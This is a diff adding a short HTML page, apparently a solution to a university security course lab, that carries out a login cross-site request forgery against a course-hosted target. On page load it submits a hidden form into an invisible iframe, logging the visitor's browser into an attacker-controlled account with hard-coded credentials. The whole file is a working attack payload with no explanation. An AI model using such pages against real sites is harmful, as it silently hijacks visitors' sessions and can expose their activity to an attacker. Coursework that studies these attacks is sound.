@@ -1,0 +1,17 @@
+<html>
+<body>
+    <script src = "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <iframe style="display:none" name = "inconspicuous"></iframe>
+
+    <form method = "post" action = "https://project2.eecs388.org/login?csrfdefense=0&xssdefense=4" target = "inconspicuous">
+        <input name = "username" value = "attacker">
+        <input name = "password" value = "l33th4x">
+    </form>
+
+    <script> 
+        $('form').submit() 
+    </script>
+
+ </body>
+ </html>
